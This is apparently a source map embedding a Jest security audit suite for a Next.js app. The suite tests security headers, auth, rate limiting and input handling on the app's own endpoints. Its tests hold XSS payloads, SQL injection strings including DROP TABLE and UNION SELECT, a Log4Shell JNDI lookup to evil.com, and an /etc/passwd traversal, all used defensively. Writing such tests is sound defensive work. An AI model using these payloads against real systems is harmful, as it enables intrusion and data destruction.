{"version":3,"sources":["R:\\Apps\\Briefly_Cloud\\briefly-cloud-nextjs\\tests\\security\\security-audit.test.ts"],"sourcesContent":["/**\r\n * Security Audit Test Suite\r\n * \r\n * Comprehensive security testing to verify system security measures\r\n */\r\n\r\nimport { describe, it, expect } from '@jest/globals';\r\n\r\ndescribe('Security Audit Tests', () => {\r\n  const baseUrl = process.env.NEXTAUTH_URL || 'http://localhost:3000';\r\n  const isProduction = process.env.NODE_ENV === 'production';\r\n\r\n  describe('HTTP Security Headers', () => {\r\n    it('should have all required security headers', async () => {\r\n      const response = await fetch(`${baseUrl}/api/health`);\r\n      const headers = response.headers;\r\n\r\n      // Content Security Policy\r\n      expect(headers.get('content-security-policy')).toBeDefined();\r\n      \r\n      // XSS Protection\r\n      expect(headers.get('x-xss-protection')).toBe('1; mode=block');\r\n      \r\n      // Content Type Options\r\n      expect(headers.get('x-content-type-options')).toBe('nosniff');\r\n      \r\n      // Frame Options\r\n      expect(headers.get('x-frame-options')).toBe('DENY');\r\n      \r\n      // Referrer Policy\r\n      expect(headers.get('referrer-policy')).toBe('strict-origin-when-cross-origin');\r\n      \r\n      // Permissions Policy\r\n      expect(headers.get('permissions-policy')).toContain('camera=()');\r\n      expect(headers.get('permissions-policy')).toContain('microphone=()');\r\n      expect(headers.get('permissions-policy')).toContain('geolocation=()');\r\n    });\r\n\r\n    it('should have HSTS header in production', async () => {\r\n      if (isProduction) {\r\n        const response = await fetch(`${baseUrl}/api/health`);\r\n        const hstsHeader = response.headers.get('strict-transport-security');\r\n        \r\n        expect(hstsHeader).toBeDefined();\r\n        expect(hstsHeader).toContain('max-age=');\r\n        expect(hstsHeader).toContain('includeSubDomains');\r\n      }\r\n    });\r\n\r\n    it('should have proper CSP configuration', async () => {\r\n      const response = await fetch(`${baseUrl}/api/health`);\r\n      const csp = response.headers.get('content-security-policy');\r\n      \r\n      expect(csp).toBeDefined();\r\n      expect(csp).toContain(\"default-src 'self'\");\r\n      expect(csp).toContain(\"object-src 'none'\");\r\n      expect(csp).toContain(\"base-uri 'self'\");\r\n      expect(csp).toContain(\"form-action 'self'\");\r\n    });\r\n  });\r\n\r\n  describe('Authentication Security', () => {\r\n    it('should protect authenticated routes', async () => {\r\n      const protectedRoutes = [\r\n        '/api/upload',\r\n        '/api/chat',\r\n        '/api/user/profile',\r\n        '/api/storage/google',\r\n        '/api/gdpr/consent',\r\n        '/api/gdpr/data-export',\r\n        '/api/gdpr/data-deletion'\r\n      ];\r\n\r\n      for (const route of protectedRoutes) {\r\n        const response = await fetch(`${baseUrl}${route}`, {\r\n          method: 'GET'\r\n        });\r\n        \r\n        expect([401, 403, 405]).toContain(response.status);\r\n      }\r\n    });\r\n\r\n    it('should protect admin routes', async () => {\r\n      const adminRoutes = [\r\n        '/api/admin',\r\n        '/api/monitoring/dashboard',\r\n        '/api/feature-flags'\r\n      ];\r\n\r\n      for (const route of adminRoutes) {\r\n        const response = await fetch(`${baseUrl}${route}`, {\r\n          method: 'GET'\r\n        });\r\n        \r\n        expect([401, 403, 404]).toContain(response.status);\r\n      }\r\n    });\r\n\r\n    it('should validate session tokens properly', async () => {\r\n      const response = await fetch(`${baseUrl}/api/user/profile`, {\r\n        headers: {\r\n          'Authorization': 'Bearer invalid-token'\r\n        }\r\n      });\r\n      \r\n      expect([401, 403]).toContain(response.status);\r\n    });\r\n  });\r\n\r\n  describe('Input Validation', () => {\r\n    it('should validate JSON input', async () => {\r\n      const response = await fetch(`${baseUrl}/api/gdpr/consent`, {\r\n        method: 'POST',\r\n        headers: {\r\n          'Content-Type': 'application/json',\r\n        },\r\n        body: 'invalid json'\r\n      });\r\n\r\n      expect(response.status).toBeGreaterThanOrEqual(400);\r\n    });\r\n\r\n    it('should validate required fields', async () => {\r\n      const response = await fetch(`${baseUrl}/api/gdpr/consent`, {\r\n        method: 'POST',\r\n        headers: {\r\n          'Content-Type': 'application/json',\r\n        },\r\n        body: JSON.stringify({})\r\n      });\r\n\r\n      expect([400, 401]).toContain(response.status);\r\n    });\r\n\r\n    it('should sanitize input data', async () => {\r\n      const maliciousInputs = [\r\n        '<script>alert(\"xss\")</script>',\r\n        '\"; DROP TABLE users; --',\r\n        '${jndi:ldap://evil.com/a}',\r\n        '../../../etc/passwd',\r\n        'javascript:alert(1)'\r\n      ];\r\n\r\n      for (const input of maliciousInputs) {\r\n        const response = await fetch(`${baseUrl}/api/gdpr/consent`, {\r\n          method: 'POST',\r\n          headers: {\r\n            'Content-Type': 'application/json',\r\n          },\r\n          body: JSON.stringify({\r\n            consent: {\r\n              essential: true,\r\n              analytics: input, // Malicious input\r\n              marketing: false,\r\n              functional: false\r\n            },\r\n            metadata: {\r\n              version: '1.0'\r\n            }\r\n          })\r\n        });\r\n\r\n        // Should either reject the input or sanitize it\r\n        expect([400, 401]).toContain(response.status);\r\n      }\r\n    });\r\n  });\r\n\r\n  describe('SQL Injection Protection', () => {\r\n    it('should prevent SQL injection in API endpoints', async () => {\r\n      const sqlInjectionPayloads = [\r\n        \"'; DROP TABLE users; --\",\r\n        \"' OR '1'='1\",\r\n        \"' UNION SELECT * FROM users --\",\r\n        \"'; INSERT INTO users VALUES ('hacker', 'password'); --\"\r\n      ];\r\n\r\n      // Test with endpoints that might be vulnerable\r\n      for (const payload of sqlInjectionPayloads) {\r\n        const response = await fetch(`${baseUrl}/api/health?test=${encodeURIComponent(payload)}`);\r\n        \r\n        // Should not cause server errors or expose data\r\n        expect(response.status).toBeLessThan(500);\r\n        \r\n        const data = await response.json();\r\n        const responseText = JSON.stringify(data);\r\n        \r\n        // Should not contain SQL error messages\r\n        expect(responseText.toLowerCase()).not.toMatch(/sql|database|table|column/);\r\n      }\r\n    });\r\n  });\r\n\r\n  describe('XSS Protection', () => {\r\n    it('should prevent reflected XSS', async () => {\r\n      const xssPayloads = [\r\n        '<script>alert(\"xss\")</script>',\r\n        '<img src=\"x\" onerror=\"alert(1)\">',\r\n        'javascript:alert(1)',\r\n        '<svg onload=\"alert(1)\">',\r\n        '\"><script>alert(1)</script>'\r\n      ];\r\n\r\n      for (const payload of xssPayloads) {\r\n        const response = await fetch(`${baseUrl}/api/health?test=${encodeURIComponent(payload)}`);\r\n        const data = await response.json();\r\n        const responseText = JSON.stringify(data);\r\n        \r\n        // Should not contain unescaped script tags or javascript\r\n        expect(responseText).not.toContain('<script>');\r\n        expect(responseText).not.toContain('javascript:');\r\n        expect(responseText).not.toContain('onerror=');\r\n        expect(responseText).not.toContain('onload=');\r\n      }\r\n    });\r\n  });\r\n\r\n  describe('CSRF Protection', () => {\r\n    it('should require proper content type for state-changing operations', async () => {\r\n      const response = await fetch(`${baseUrl}/api/gdpr/consent`, {\r\n        method: 'POST',\r\n        headers: {\r\n          'Content-Type': 'text/plain',\r\n        },\r\n        body: 'malicious data'\r\n      });\r\n\r\n      expect([400, 401, 415]).toContain(response.status);\r\n    });\r\n\r\n    it('should validate origin headers', async () => {\r\n      const response = await fetch(`${baseUrl}/api/gdpr/consent`, {\r\n        method: 'POST',\r\n        headers: {\r\n          'Content-Type': 'application/json',\r\n          'Origin': 'https://evil.com'\r\n        },\r\n        body: JSON.stringify({\r\n          consent: { essential: true, analytics: false, marketing: false, functional: false },\r\n          metadata: { version: '1.0' }\r\n        })\r\n      });\r\n\r\n      expect([400, 401, 403]).toContain(response.status);\r\n    });\r\n  });\r\n\r\n  describe('Rate Limiting', () => {\r\n    it('should have rate limiting headers', async () => {\r\n      const response = await fetch(`${baseUrl}/api/health`);\r\n      \r\n      expect(response.headers.get('x-ratelimit-limit')).toBeDefined();\r\n      expect(response.headers.get('x-ratelimit-remaining')).toBeDefined();\r\n      expect(response.headers.get('x-ratelimit-reset')).toBeDefined();\r\n    });\r\n\r\n    it('should handle rapid requests appropriately', async () => {\r\n      const rapidRequests = 20;\r\n      const promises = Array(rapidRequests).fill(null).map(() =>\r\n        fetch(`${baseUrl}/api/health`)\r\n      );\r\n\r\n      const responses = await Promise.all(promises);\r\n      \r\n      // All requests should succeed or be rate limited (not server errors)\r\n      responses.forEach(response => {\r\n        expect([200, 429]).toContain(response.status);\r\n      });\r\n    });\r\n  });\r\n\r\n  describe('Information Disclosure', () => {\r\n    it('should not expose sensitive information in error messages', async () => {\r\n      const response = await fetch(`${baseUrl}/api/nonexistent`);\r\n      const data = await response.json();\r\n      const responseText = JSON.stringify(data);\r\n\r\n      // Should not expose internal paths, stack traces, or sensitive data\r\n      expect(responseText.toLowerCase()).not.toMatch(/password|secret|key|token|api_key/);\r\n      expect(responseText).not.toMatch(/\\/[a-z]+\\/[a-z]+\\/[a-z]+/); // File paths\r\n      expect(responseText).not.toContain('Error:');\r\n      expect(responseText).not.toContain('at ');\r\n    });\r\n\r\n    it('should not expose server information', async () => {\r\n      const response = await fetch(`${baseUrl}/api/health`);\r\n      \r\n      // Should not expose server software versions\r\n      expect(response.headers.get('server')).toBeNull();\r\n      expect(response.headers.get('x-powered-by')).toBeNull();\r\n    });\r\n\r\n    it('should not expose environment variables', async () => {\r\n      const response = await fetch(`${baseUrl}/api/health`);\r\n      const data = await response.json();\r\n      const responseText = JSON.stringify(data);\r\n\r\n      // Should not contain environment variable patterns\r\n      expect(responseText).not.toMatch(/[A-Z_]+_KEY/);\r\n      expect(responseText).not.toMatch(/[A-Z_]+_SECRET/);\r\n      expect(responseText).not.toMatch(/[A-Z_]+_TOKEN/);\r\n    });\r\n  });\r\n\r\n  describe('File Upload Security', () => {\r\n    it('should validate file types', async () => {\r\n      // This would require actual file upload testing\r\n      // For now, we verify the endpoint exists and requires auth\r\n      const response = await fetch(`${baseUrl}/api/upload`, {\r\n        method: 'POST'\r\n      });\r\n\r\n      expect([401, 403, 400]).toContain(response.status);\r\n    });\r\n  });\r\n\r\n  describe('Session Security', () => {\r\n    it('should have secure session configuration', async () => {\r\n      // Verify NextAuth configuration\r\n      expect(process.env.NEXTAUTH_SECRET).toBeDefined();\r\n      expect(process.env.NEXTAUTH_SECRET!.length).toBeGreaterThan(32);\r\n      \r\n      if (isProduction) {\r\n        expect(process.env.NEXTAUTH_URL).toMatch(/^https:/);\r\n      }\r\n    });\r\n  });\r\n\r\n  describe('API Security', () => {\r\n    it('should not expose internal API structure', async () => {\r\n      const response = await fetch(`${baseUrl}/api`);\r\n      \r\n      // Should not return directory listing or API documentation\r\n      expect([404, 405]).toContain(response.status);\r\n    });\r\n\r\n    it('should handle malformed requests gracefully', async () => {\r\n      const malformedRequests = [\r\n        { method: 'GET', headers: { 'Content-Length': '-1' } },\r\n        { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: 'a'.repeat(10000) },\r\n        { method: 'PUT', headers: { 'Transfer-Encoding': 'chunked' } }\r\n      ];\r\n\r\n      for (const request of malformedRequests) {\r\n        try {\r\n          const response = await fetch(`${baseUrl}/api/health`, request);\r\n          expect(response.status).toBeLessThan(500);\r\n        } catch (error) {\r\n          // Network errors are acceptable for malformed requests\r\n          expect(error).toBeDefined();\r\n        }\r\n      }\r\n    });\r\n  });\r\n\r\n  describe('Dependency Security', () => {\r\n    it('should not have known vulnerable dependencies', async () => {\r\n      // This would typically be checked by npm audit or similar tools\r\n      // For now, we verify the system is running\r\n      const response = await fetch(`${baseUrl}/api/health`);\r\n      expect(response.status).toBe(200);\r\n    });\r\n  });\r\n\r\n  describe('Environment Security', () => {\r\n    it('should have secure environment configuration', async () => {\r\n      // Verify critical environment variables are set\r\n      const requiredSecureEnvVars = [\r\n        'NEXTAUTH_SECRET',\r\n        'SUPABASE_SERVICE_ROLE_KEY',\r\n        'OPENAI_API_KEY'\r\n      ];\r\n\r\n      requiredSecureEnvVars.forEach(envVar => {\r\n        expect(process.env[envVar]).toBeDefined();\r\n        expect(process.env[envVar]!.length).toBeGreaterThan(10);\r\n      });\r\n    });\r\n\r\n    it('should use HTTPS in production', async () => {\r\n      if (isProduction) {\r\n        expect(baseUrl).toMatch(/^https:/);\r\n      }\r\n    });\r\n  });\r\n});"],"names":["describe","baseUrl","process","env","NEXTAUTH_URL","isProduction","NODE_ENV","it","response","fetch","headers","expect","get","toBeDefined","toBe","toContain","hstsHeader","csp","protectedRoutes","route","method","status","adminRoutes","body","toBeGreaterThanOrEqual","JSON","stringify","maliciousInputs","input","consent","essential","analytics","marketing","functional","metadata","version","sqlInjectionPayloads","payload","encodeURIComponent","toBeLessThan","data","json","responseText","toLowerCase","not","toMatch","xssPayloads","rapidRequests","promises","Array","fill","map","responses","Promise","all","forEach","toBeNull","NEXTAUTH_SECRET","length","toBeGreaterThan","malformedRequests","repeat","request","error","requiredSecureEnvVars","envVar"],"mappings":"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"}